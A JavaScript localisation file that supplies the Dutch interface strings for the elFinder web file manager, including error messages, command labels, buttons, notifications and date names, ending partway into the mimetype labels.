/**
 * Nederlands translation
 * @author Barry vd. Heuvel <barry@fruitcakestudio.nl>
 * @author Patrick Tingen <patrick@tingen.net>
 * @version 2022-03-02
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.nl = {
		translator : 'Barry vd. Heuvel &lt;barry@fruitcakestudio.nl&gt;, Patrick Tingen &lt;patrick@tingen.net&gt;',
		language   : 'Nederlands',
		direction  : 'ltr',
		dateFormat : 'd-m-Y H:i', // will show like: 02-03-2022 15:08
		fancyDateFormat : '$1 H:i', // will show like: Vandaag 15:08
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220302-150849
		messages   : {
			'getShareText' : 'Delen',
			'Editor ': 'Code-editor',

			/********************************** errors **********************************/
			'error'                : 'Fout',
			'errUnknown'           : 'Onbekend fout',
			'errUnknownCmd'        : 'Onbekend commando',
			'errJqui'              : 'Ongeldige jQuery UI configuratie. Selectable, draggable en droppable componenten moeten aanwezig zijn',
			'errNode'              : 'Voor elFinder moet een DOM Element gemaakt worden',
			'errURL'               : 'Ongeldige elFinder configuratie! URL optie is niet ingesteld',
			'errAccess'            : 'Toegang geweigerd',
			'errConnect'           : 'Kan geen verbinding met de backend maken',
			'errAbort'             : 'Verbinding afgebroken',
			'errTimeout'           : 'Verbinding time-out',
			'errNotFound'          : 'Backend niet gevonden',
			'errResponse'          : 'Ongeldige reactie van de backend',
			'errConf'              : 'Ongeldige backend configuratie',
			'errJSON'              : 'PHP JSON module niet geïnstalleerd',
			'errNoVolumes'         : 'Leesbaar volume is niet beschikbaar',
			'errCmdParams'         : 'Ongeldige parameters voor commando "$1"',
			'errDataNotJSON'       : 'Data is niet JSON',
			'errDataEmpty'         : 'Data is leeg',
			'errCmdReq'            : 'Backend verzoek heeft een commando naam nodig',
			'errOpen'              : 'Kan "$1" niet openen',
			'errNotFolder'         : 'Object is geen map',
			'errNotFile'           : 'Object is geen bestand',
			'errRead'              : 'Kan "$1" niet lezen',
			'errWrite'             : 'Kan niet schrijven in "$1"',
			'errPerm'              : 'Toegang geweigerd',
			'errLocked'            : '"$1" is vergrendeld en kan niet hernoemd, verplaats of verwijderd worden',
			'errExists'            : 'Bestand "$1" bestaat al',
			'errInvName'           : 'Ongeldige bestandsnaam',
			'errInvDirname'        : 'Ongeldige mapnaam.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Map niet gevonden',
			'errFileNotFound'      : 'Bestand niet gevonden',
			'errTrgFolderNotFound' : 'Doelmap "$1" niet gevonden',
			'errPopup'             : 'De browser heeft voorkomen dat de pop-up is geopend. Pas de browser instellingen aan om de popup te kunnen openen',
			'errMkdir'             : 'Kan map "$1" niet aanmaken',
			'errMkfile'            : 'Kan bestand "$1" niet aanmaken',
			'errRename'            : 'Kan "$1" niet hernoemen',
			'errCopyFrom'          : 'Bestanden kopiëren van "$1" is niet toegestaan',
			'errCopyTo'            : 'Bestanden kopiëren naar "$1" is niet toegestaan',
			'errMkOutLink'         : 'Kan geen link maken buiten de hoofdmap', // from v2.1 added 03.10.2015
			'errUpload'            : 'Upload fout',  // old name - errUploadCommon
			'errUploadFile'        : 'Kan "$1" niet uploaden', // old name - errUpload
			'errUploadNoFiles'     : 'Geen bestanden gevonden om te uploaden',
			'errUploadTotalSize'   : 'Data overschrijdt de maximale grootte', // old name - errMaxSize
			'errUploadFileSize'    : 'Bestand overschrijdt de maximale grootte', //  old name - errFileMaxSize
			'errUploadMime'        : 'Bestandstype niet toegestaan',
			'errUploadTransfer'    : '"$1" overdrachtsfout',
			'errUploadTemp'        : 'Kan geen tijdelijk bestand voor de upload maken', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Object "$1" bestaat al op deze locatie en kan niet vervangen worden door een ander type object', // new
			'errReplace'           : 'Kan "$1" niet vervangen',
			'errSave'              : 'Kan "$1" niet opslaan',
			'errCopy'              : 'Kan "$1" niet kopiëren',
			'errMove'              : 'Kan "$1" niet verplaatsen',
			'errCopyInItself'      : 'Kan "$1" niet in zichzelf kopiëren',
			'errRm'                : 'Kan "$1" niet verwijderen',
			'errTrash'             : 'Kan niet in de prullenbak.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Kan bronbestanden niet verwijderen',
			'errExtract'           : 'Kan de bestanden van "$1" niet uitpakken',
			'errArchive'           : 'Kan het archief niet maken',
			'errArcType'           : 'Archief type is niet ondersteund',
			'errNoArchive'         : 'Bestand is geen archief of geen ondersteund archief type',
			'errCmdNoSupport'      : 'Backend ondersteund dit commando niet',
			'errReplByChild'       : 'De map "$1" kan niet vervangen worden door een item uit die map',
			'errArcSymlinks'       : 'Om veiligheidsredenen kan een bestand met symlinks of bestanden met niet toegestane namen niet worden uitgepakt ', // edited 24.06.2012
			'errArcMaxSize'        : 'Archief overschrijdt de maximale bestandsgrootte',
			'errResize'            : 'Kan het formaat van "$1" niet wijzigen',
			'errResizeDegree'      : 'Ongeldig aantal graden om te draaien',  // added 7.3.2013
			'errResizeRotate'      : 'Afbeelding kan niet gedraaid worden',  // added 7.3.2013
			'errResizeSize'        : 'Ongeldig afbeelding formaat',  // added 7.3.2013
			'errResizeNoChange'    : 'Afbeelding formaat is niet veranderd',  // added 7.3.2013
			'errUsupportType'      : 'Bestandstype wordt niet ondersteund',
			'errNotUTF8Content'    : 'Bestand "$1" is niet in UTF-8 and kan niet aangepast worden',  // added 9.11.2011
			'errNetMount'          : 'Kan "$1" niet mounten', // added 17.04.2012
			'errNetMountNoDriver'  : 'Niet ondersteund protocol',     // added 17.04.2012
			'errNetMountFailed'    : 'Mount mislukt',         // added 17.04.2012
			'errNetMountHostReq'   : 'Host is verplicht', // added 18.04.2012
			'errSessionExpires'    : 'Uw sessie is verlopen vanwege inactiviteit',
			'errCreatingTempDir'   : 'Kan de tijdelijke map niet aanmaken: "$1" ',
			'errFtpDownloadFile'   : 'Kan het bestand niet downloaden vanaf FTP: "$1"',
			'errFtpUploadFile'     : 'Kan het bestand niet uploaden naar FTP: "$1"',
			'errFtpMkdir'          : 'Kan het externe map niet aanmaken op de FTP-server: "$1"',
			'errArchiveExec'       : 'Er is een fout opgetreden bij het archivering van de bestanden: "$1" ',
			'errExtractExec'       : 'Er is een fout opgetreden bij het uitpakken van de bestanden: "$1" ',
			'errNetUnMount'        : 'Kan niet unmounten', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Niet om te zetten naar UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Probeer een moderne browser als je bestanden wil uploaden', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Time-out bij zoeken naar "$1". Zoekresulataat is niet compleet', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Je moet je opnieuw aanmelden', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Max aantal selecteerbare items is $1', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Kan niet herstellen uit prullenbak, weet niet waar het heen moet', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Geen editor voor dit type bestand', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Fout opgetreden op de server', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Kan folder "$1" niet legen', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Er zijn nog $1 fouten', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'U kunt maximaal $1 mappen tegelijk maken.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Maak archief',
			'cmdback'      : 'Vorige',
			'cmdcopy'      : 'Kopieer',
			'cmdcut'       : 'Knip',
			'cmddownload'  : 'Downloaden',
			'cmdduplicate' : 'Dupliceer',
			'cmdedit'      : 'Pas bestand aan',
			'cmdextract'   : 'Bestanden uit archief uitpakken',
			'cmdforward'   : 'Volgende',
			'cmdgetfile'   : 'Kies bestanden',
			'cmdhelp'      : 'Over deze software',
			'cmdhome'      : 'Home',
			'cmdinfo'      : 'Bekijk info',
			'cmdmkdir'     : 'Nieuwe map',
			'cmdmkdirin'   : 'In nieuwe map', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nieuw bestand',
			'cmdopen'      : 'Open',
			'cmdpaste'     : 'Plak',
			'cmdquicklook' : 'Voorbeeld',
			'cmdreload'    : 'Vernieuwen',
			'cmdrename'    : 'Naam wijzigen',
			'cmdrm'        : 'Verwijder',
			'cmdtrash'     : 'Naar prullenbak', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Herstellen', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Zoek bestanden',
			'cmdup'        : 'Ga een map hoger',
			'cmdupload'    : 'Upload bestanden',
			'cmdview'      : 'Bekijk',
			'cmdresize'    : 'Formaat wijzigen',
			'cmdsort'      : 'Sorteren',
			'cmdnetmount'  : 'Mount netwerk volume', // added 18.04.2012
			'cmdnetunmount': 'Afmelden', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Naar Plaatsen', // added 28.12.2014
			'cmdchmod'     : 'Wijzig modus', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Open een map', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Herstel kolombreedtes', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Volledig scherm', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Verplaatsen', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Map leegmaken', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'ongedaan maken', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Opnieuw doen', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Voorkeuren', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Selecteer alles', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Deselecteer alles', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Selectie omkeren', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Open in nieuw venster', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Verberg (voorkeur)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Sluit',
			'btnSave'   : 'Opslaan',
			'btnRm'     : 'Verwijder',
			'btnApply'  : 'Toepassen',
			'btnCancel' : 'Annuleren',
			'btnNo'     : 'Nee',
			'btnYes'    : 'Ja',
			'btnMount'  : 'Mount',  // added 18.04.2012
			'btnApprove': 'Ga naar $1 & keur goed', // from v2.1 added 26.04.2012
			'btnUnmount': 'Afmelden', // from v2.1 added 30.04.2012
			'btnConv'   : 'Converteer', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Hier',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Volume',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Alles',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Mime type', // from v2.1 added 22.5.2015
			'btnFileName':'Bestandsnaam',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Opslaan & Sluiten', // from v2.1 added 12.6.2015
			'btnBackup' : 'Back-up', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Hernoemen',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Hernoem alles', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Vorige ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Volgende ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Opslaan als', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Bezig met openen van map',
			'ntffile'     : 'Bezig met openen bestand',
			'ntfreload'   : 'Herladen map inhoud',
			'ntfmkdir'    : 'Bezig met map maken',
			'ntfmkfile'   : 'Bezig met Bestanden maken',
			'ntfrm'       : 'Verwijderen bestanden',
			'ntfcopy'     : 'Kopieer bestanden',
			'ntfmove'     : 'Verplaats bestanden',
			'ntfprepare'  : 'Voorbereiden kopiëren',
			'ntfrename'   : 'Hernoem bestanden',
			'ntfupload'   : 'Bestanden uploaden actief',
			'ntfdownload' : 'Bestanden downloaden actief',
			'ntfsave'     : 'Bestanden opslaan',
			'ntfarchive'  : 'Archief aan het maken',
			'ntfextract'  : 'Bestanden uitpakken actief',
			'ntfsearch'   : 'Zoeken naar bestanden',
			'ntfresize'   : 'Formaat wijzigen van afbeeldingen',
			'ntfsmth'     : 'Iets aan het doen',
			'ntfloadimg'  : 'Laden van plaatje',
			'ntfnetmount' : 'Mounten van netwerk volume', // added 18.04.2012
			'ntfnetunmount': 'Unmounten van netwerk volume', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Opvragen afbeeldingen dimensies', // added 20.05.2013
			'ntfreaddir'  : 'Map informatie lezen', // from v2.1 added 01.07.2013
			'ntfurl'      : 'URL van link ophalen', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Bestandsmodus wijzigen', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Upload bestandsnaam verifiëren', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Zipbestand aan het maken', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Verzamelen padinformatie', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Aan het verwerken', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Aan het verwijderen', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Aan het herstellen', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Controleren doelmap', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Vorige bewerking ongedaan maken', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Opnieuw doen', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Inhoud controleren', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Prullenbak', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'onbekend',
			'Today'       : 'Vandaag',
			'Yesterday'   : 'Gisteren',
			'msJan'       : 'Jan',
			'msFeb'       : 'februari',
			'msMar'       : 'maart',
			'msApr'       : 'april',
			'msMay'       : 'Mei',
			'msJun'       : 'Jun',
			'msJul'       : 'juli',
			'msAug'       : 'aug',
			'msSep'       : 'september',
			'msOct'       : 'Okt',
			'msNov'       : 'november',
			'msDec'       : 'december',
			'January'     : 'Januari',
			'February'    : 'Februari',
			'March'       : 'Maart',
			'April'       : 'april',
			'May'         : 'Mei',
			'June'        : 'Juni',
			'July'        : 'Juli',
			'August'      : 'Augustus',
			'September'   : 'september',
			'October'     : 'Oktober',
			'November'    : 'november',
			'December'    : 'december',
			'Sunday'      : 'Zondag',
			'Monday'      : 'Maandag',
			'Tuesday'     : 'Dinsdag',
			'Wednesday'   : 'Woensdag',
			'Thursday'    : 'Donderdag',
			'Friday'      : 'Vrijdag',
			'Saturday'    : 'Zaterdag',
			'Sun'         : 'Zo',
			'Mon'         : 'Ma',
			'Tue'         : 'Di',
			'Wed'         : 'Wo',
			'Thu'         : 'Do',
			'Fri'         : 'Vr',
			'Sat'         : 'Za',

			/******************************** sort variants ********************************/
			'sortname'          : 'op naam',
			'sortkind'          : 'op type',
			'sortsize'          : 'op grootte',
			'sortdate'          : 'op datum',
			'sortFoldersFirst'  : 'Mappen eerst',
			'sortperm'          : 'op rechten', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'op mode',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'op eigenaar',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'op groep',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Als boom',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NieuwBestand.txt', // added 10.11.2015
			'untitled folder'   : 'NieuweMap',   // added 10.11.2015
			'Archive'           : 'NieuwArchief',  // from v2.1 added 10.11.2015
			'untitled file'     : 'NieuwBestand.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Bestand',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Bevestiging nodig',
			'confirmRm'       : 'Weet u zeker dat u deze bestanden wil verwijderen?<br/>Deze actie kan niet ongedaan gemaakt worden!',
			'confirmRepl'     : 'Oud bestand vervangen door het nieuwe bestand?',
			'confirmRest'     : 'Bestaand item vervangen door het item in de prullenbak?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Niet in UTF-8<br/>Converteren naar UTF-8?<br/>De inhoud wordt UTF-8 door op te slaan na de conversie', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Tekencodering van dit bestand kan niet worden gedetecteerd. Het moet tijdelijk worden geconverteerd naar UTF-8 voor bewerking.<br/>Selecteer de tekencodering van dit bestand.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Het is aangepast.<br/>Wijzigingen gaan verloren als je niet opslaat', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Weet u zeker dat u items naar de prullenbak wilt verplaatsen?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Weet u zeker dat u items naar \'$1\' wilt verplaatsen?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Toepassen op alles',
			'name'            : 'Naam',
			'size'            : 'Grootte',
			'perms'           : 'Rechten',
			'modify'          : 'Aangepast',
			'kind'            : 'Type',
			'read'            : 'lees',
			'write'           : 'schrijf',
			'noaccess'        : 'geen toegang',
			'and'             : 'en',
			'unknown'         : 'onbekend',
			'selectall'       : 'Selecteer alle bestanden',
			'selectfiles'     : 'Selecteer bestand(en)',
			'selectffile'     : 'Selecteer eerste bestand',
			'selectlfile'     : 'Selecteer laatste bestand',
			'viewlist'        : 'Lijst weergave',
			'viewicons'       : 'Icoon weergave',
			'viewSmall'       : 'Klein', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Middelgroot', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Groot', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Extra groot', // from v2.1.39 added 22.5.2018
			'places'          : 'Plaatsen',
			'calc'            : 'Bereken',
			'path'            : 'Pad',
			'aliasfor'        : 'Alias voor',
			'locked'          : 'Vergrendeld',
			'dim'             : 'Dimensies',
			'files'           : 'Bestanden',
			'folders'         : 'Mappen',
			'items'           : 'Artikelen',
			'yes'             : 'ja',
			'no'              : 'nee',
			'link'            : 'Koppeling',
			'searcresult'     : 'Zoek resultaten',
			'selected'        : 'geselecteerde items',
			'about'           : 'Over',
			'shortcuts'       : 'Snelkoppelingen',
			'help'            : 'Helpen',
			'webfm'           : 'Web bestandsmanager',
			'ver'             : 'Versie',
			'protocolver'     : 'protocol versie',
			'homepage'        : 'Project thuis',
			'docs'            : 'Documentatie',
			'github'          : 'Fork ons op Github',
			'twitter'         : 'Volg ons op twitter',
			'facebook'        : 'Wordt lid op facebook',
			'team'            : 'Team',
			'chiefdev'        : 'Hoofd ontwikkelaar',
			'developer'       : 'ontwikkelaar',
			'contributor'     : 'bijdrager',
			'maintainer'      : 'onderhouder',
			'translator'      : 'vertaler',
			'icons'           : 'Iconen',
			'dontforget'      : 'En vergeet je handdoek niet!',
			'shortcutsof'     : 'Snelkoppelingen uitgeschakeld',
			'dropFiles'       : 'Sleep hier uw bestanden heen',
			'or'              : 'of',
			'selectForUpload' : 'Selecteer bestanden om te uploaden',
			'moveFiles'       : 'Verplaats bestanden',
			'copyFiles'       : 'Kopieer bestanden',
			'restoreFiles'    : 'Items herstellen', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Verwijder uit Plaatsen',
			'aspectRatio'     : 'beeldverhouding',
			'scale'           : 'Schaal',
			'width'           : 'Breedte',
			'height'          : 'Hoogte',
			'resize'          : 'Verkleinen',
			'crop'            : 'Bijsnijden',
			'rotate'          : 'Draaien',
			'rotate-cw'       : 'Draai 90 graden rechtsom',
			'rotate-ccw'      : 'Draai 90 graden linksom',
			'degree'          : '°',
			'netMountDialogTitle' : 'Mount netwerk volume', // added 18.04.2012
			'protocol'            : 'Protocol', // added 18.04.2012
			'host'                : 'Gastheer', // added 18.04.2012
			'port'                : 'Poort', // added 18.04.2012
			'user'                : 'Gebruikersnaams', // added 18.04.2012
			'pass'                : 'Wachtwoord', // added 18.04.2012
			'confirmUnmount'      : 'Weet u zeker dat u $1 wil unmounten?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Sleep of plak bestanden vanuit de browser', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Sleep of plak bestanden hier', // from v2.1 added 07.04.2014
			'encoding'        : 'Encodering', // from v2.1 added 19.12.2014
			'locale'          : 'Localisatie',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Doel: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Zoek op invoer MIME Type', // from v2.1 added 22.5.2015
			'owner'           : 'Eigenaar', // from v2.1 added 20.6.2015
			'group'           : 'Groep', // from v2.1 added 20.6.2015
			'other'           : 'Overig', // from v2.1 added 20.6.2015
			'execute'         : 'Uitvoeren', // from v2.1 added 20.6.2015
			'perm'            : 'Rechten', // from v2.1 added 20.6.2015
			'mode'            : 'Modus', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Map is leeg', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Map is leeg\\A Sleep hier naar toe om toe te voegen', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Map is leeg\\A Lang ingedrukt houden om toe te voegen', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kwaliteit', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Automatisch synchroniseren',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Omhoog',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Geef link', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Geselecteerde items ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'Map ID', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Toestaan offline toegang', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Opnieuw autenticeren', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Laden..', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Open meerdere bestanden', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Je probeert het $1 bestanden te openen. Weet je zeker dat je dat in je browser wil doen?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Geen zoekresultaten', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Bestand wordt bewerkt', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Je hebt $1 items geselecteerd', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Je hebt $1 items op het clipboard', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Verder zoeken kan alleen vanuit huidige view', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Herstellen', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 compleet', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Contextmenu', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Pagina omslaan', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Volumewortels', // from v2.1.16 added 16.9.2016
			'reset'           : 'Resetten', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Achtergrondkleur', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Kleurkiezer', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px raster', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Actief', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Inactief', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Zoekresultaten zijn leeg in actuele view\\ADruk [Enter] om zoekgebied uit te breiden', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Zoeken op eerste letter is leeg in actuele view', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Tekstlabel', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 minuten over', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Opnieuw openen met geselecteerde encoding', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Opslaan met geselecteerde encoding', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Selecteer map', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Zoeken op eerste letter', // from v2.1.23 added 24.3.2017
			'presets'         : 'Voorkeuren', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Teveel voor in de prullenbak', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Tekstgebied', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Map "$1" legen', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Er zijn geen items in map "$1"', // from v2.1.25 added 22.6.2017
			'preference'      : 'Voorkeur', // from v2.1.26 added 28.6.2017
			'language'        : 'Taal', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Initialiseer instellingen van deze browser', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Toolbar instellingen', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 tekens over',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $1 regels over.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Totaal', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Geschatte bestandsgrootte', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Focus op het dialoogelement met mouseover',  // from v2.1.30 added 2.11.2017
			'select'          : 'Selecteren', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Actie als bestand is geselecteerd', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Open met laatstgebruikte editor', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Selectie omkeren', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Weet je zeker dat je $1 items wil hernoemen naar $2?<br/>Dit kan niet ongedaan worden gemaakt!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Batch hernoemen', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Nummer', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Voeg prefix toe', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Voeg suffix toe', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Verander extentie', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Kolominstelllingen (List view)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Aanpassingen worden direct toegepast op het archief', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Aanpassingen worden pas toegepast na re-mount van dit volume', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Deze volume(s) worden ook unmounted. Weet je het zeker?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Selectie informatie', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmes voor file hash', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Informatie Items (Selectie Info Panel)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Druk nogmaals om te eindigen', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Werkbalk', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Werkruimte', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialoog', // from v2.1.38 added 4.4.2018
			'all'             : 'Alles', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Icoongrootte (Icons view)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Open de maximale editor', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Conversie via API is niet beschikbaar, converteer aub op de website', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'After conversion, you must be upload with the item URL or a downloaded file to save the converted file', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Converteer op de site $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integratie', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Deze elFinder heeft de volgende externe services. Controleer de voorwaarden, privacy policy, etc. voor gebruik', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Toon verborgen items', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Verberg verborgen items', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Toon/verberg verborgen items', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'File types die aangemaakt mogen worden', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Type voor tekstbestand', // from v2.1.41 added 7.8.2018
			'add'             : 'Toevoegen', // from v2.1.41 added 7.8.2018
			'theme'           : 'Thema', // from v2.1.43 added 19.10.2018
			'default'         : 'Standaard', // from v2.1.43 added 19.10.2018
			'description'     : 'Beschrijving', // from v2.1.43 added 19.10.2018
			'website'         : 'Website', // from v2.1.43 added 19.10.2018
			'author'          : 'Auteur', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Licensie', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Dit item kan niet worden opgeslagen, exporteer naar je pc om wijzingen te bewaren', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Dubbelklik op het bestand om het te selecteren.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Volledig scherm gebruiken', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Onbekend',
			'kindRoot'        : 'Volume root', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Map',
